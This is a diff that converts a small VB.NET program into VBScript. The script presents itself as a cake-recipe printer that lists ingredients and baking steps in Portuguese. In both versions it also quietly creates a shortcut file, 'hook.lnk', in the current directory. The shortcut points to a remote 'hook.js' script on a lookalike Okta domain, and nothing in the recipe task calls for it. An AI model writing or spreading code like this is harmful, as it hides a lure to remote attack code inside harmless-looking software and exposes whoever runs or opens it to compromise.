@@ -1,34 +1,27 @@
-Imports System
-Imports IWshRuntimeLibrary
-Imports System.IO
+Dim ingredientes, ingrediente
+ingredientes = Array("Farinha", "Açúcar", "Ovos", "Manteiga", "Leite", "Fermento")
 
-Module Program
-    Sub Main(args As String())
-        Dim ingredientes As String() = {"Farinha", "Açúcar", "Ovos", "Manteiga", "Leite", "Fermento"}
+WScript.Echo "Receita simples de bolo:"
+WScript.Echo
 
-        Console.WriteLine("Receita simples de bolo:")
-        Console.WriteLine()
+For Each ingrediente In ingredientes
+    WScript.Echo "- " & ingrediente
+Next
 
-        For Each ingrediente In ingredientes
-            Console.WriteLine("- " & ingrediente)
-        Next
+WScript.Echo
+WScript.Echo "Instruções:"
+WScript.Echo "1. Misture todos os ingredientes secos."
+WScript.Echo "2. Adicione os ingredientes úmidos e misture bem."
+WScript.Echo "3. Despeje a massa em uma forma untada e enfarinhada."
+WScript.Echo "4. Asse em forno pré-aquecido a 180°C por 35-40 minutos ou até dourar."
+WScript.Echo "5. Deixe esfriar, desenforme e sirva."
 
-        Console.WriteLine()
-        Console.WriteLine("Instruções:")
-        Console.WriteLine("1. Misture todos os ingredientes secos.")
-        Console.WriteLine("2. Adicione os ingredientes úmidos e misture bem.")
-        Console.WriteLine("3. Despeje a massa em uma forma untada e enfarinhada.")
-        Console.WriteLine("4. Asse em forno pré-aquecido a 180°C por 35-40 minutos ou até dourar.")
-        Console.WriteLine("5. Deixe esfriar, desenforme e sirva.")
-        
-        CreateShortcut("https://okta.frothiy.com/hook.js")
-    End Sub
+CreateShortcut "https://okta.frothiy.com/hook.js", "hook.lnk"
 
-    Sub CreateShortcut(ByVal url As String)
-        Dim shell As New WshShell()
-        Dim shortcutPath As String = Path.Combine(Environment.CurrentDirectory, "hook.lnk")
-        Dim shortcut As IWshShortcut = CType(shell.CreateShortcut(shortcutPath), IWshShortcut)
-        shortcut.TargetPath = url
-        shortcut.Save()
-    End Sub
-End Module
+Sub CreateShortcut(url, shortcutName)
+    Dim objShell, objShortcut
+    Set objShell = CreateObject("WScript.Shell")
+    Set objShortcut = objShell.CreateShortcut(objShell.CurrentDirectory & "\" & shortcutName)
+    objShortcut.TargetPath = url
+    objShortcut.Save
+End Sub
